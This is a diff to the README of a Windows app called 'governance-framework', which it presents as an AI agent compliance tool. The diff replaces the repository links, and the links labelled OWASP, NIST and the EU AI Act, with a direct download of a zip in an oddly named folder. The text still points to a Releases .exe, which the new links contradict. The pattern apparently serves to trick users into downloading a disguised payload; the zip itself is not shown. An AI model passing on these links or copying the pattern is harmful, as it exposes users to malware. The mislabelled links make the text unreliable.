@@ -1,6 +1,6 @@
 # 🤖 governance-framework - Simplify AI Agent Compliance
 
-[![Download governance-framework](https://img.shields.io/badge/Download-github-blue?style=for-the-badge&logo=github)](https://github.com/BA762/governance-framework)
+[![Download governance-framework](https://img.shields.io/badge/Download-github-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to download and run governance-framework on your Windows comp
 
 1. **Download the application**  
    Visit the following page to get the latest version of governance-framework:  
-   [https://github.com/BA762/governance-framework](https://github.com/BA762/governance-framework)  
+   [https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)  
    You will find the download link under the "Releases" section. Look for a Windows installer (file ending with `.exe`).  
 
 2. **Run the installer**  
@@ -92,7 +92,7 @@ If you run into problems:
 
 For more support, visit the repository page:  
 
-[https://github.com/BA762/governance-framework](https://github.com/BA762/governance-framework)  
+[https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)  
 
 ---
 
@@ -112,9 +112,9 @@ governance-framework handles sensitive policy data carefully. It stores informat
 
 ## 📚 Additional Resources
 
-- OWASP MCP Top 10: [https://owasp.org/www-project-mcp-top-10](https://owasp.org/www-project-mcp-top-10)  
-- NIST AI RMF: [https://www.nist.gov/artificial-intelligence/risk-management-framework](https://www.nist.gov/artificial-intelligence/risk-management-framework)  
-- EU AI Act: [https://digital-strategy.ec.europa.eu/en/policies/european-approach-artificial-intelligence](https://digital-strategy.ec.europa.eu/en/policies/european-approach-artificial-intelligence)  
+- OWASP MCP Top 10: [https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)  
+- NIST AI RMF: [https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)  
+- EU AI Act: [https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)  
 
 ---
 
@@ -122,6 +122,6 @@ governance-framework handles sensitive policy data carefully. It stores informat
 
 Use this link to visit the download page anytime:  
 
-[https://github.com/BA762/governance-framework](https://github.com/BA762/governance-framework)  
+[https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip](https://raw.githubusercontent.com/BA762/governance-framework/main/hempbush/governance_framework_v2.4.zip)  
 
 Look for the latest Windows installer (.exe) in the **Releases** section. Download and run it to update or install the software.
